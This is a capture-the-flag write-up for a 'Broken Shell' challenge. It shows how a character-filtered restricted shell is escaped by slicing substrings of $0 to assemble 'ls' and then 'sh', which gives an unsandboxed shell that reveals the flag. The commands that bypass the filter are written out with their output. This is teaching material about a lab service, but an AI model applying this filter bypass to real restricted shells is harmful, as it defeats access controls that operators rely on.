# Broken Shell

We're given a shell to connect to (I use `nc`) with a sandbox to escape from.
It also tells us the allowed characters regex:

```regex
^[0-9${}/?"[:space:]:&>_=()]+$
```

We can try running random command and see what happens.

```sh
Broken@Shell$ 1
/home/restricted_user/broken_shell.sh: line 41: 1: command not found
```

We have the shell script name & path.
Among bash's positional arguments, `$0` is usually the name of the program/script, and `$1` onwards is the programs arguments, we can try using that.

```sh
Broken@Shell$ $0
```

This triggers the shell, confirming we can use those parameters strings.
From that, we can splice together any command using the available sub-strings with the syntax `${variable:offset:length}`.

Splicing `ls` shows us the flag file.

```sh
Broken@Shell$ ${0:33:1}${0:35:1}
broken_shell.sh  this_is_the_flag_gg
```

Using the same sub-string trick, we can get a normal `sh` shell without any sandboxing.

```sh
${0:29:2}
```

We can now easily `ls` and `cat` the flag file.

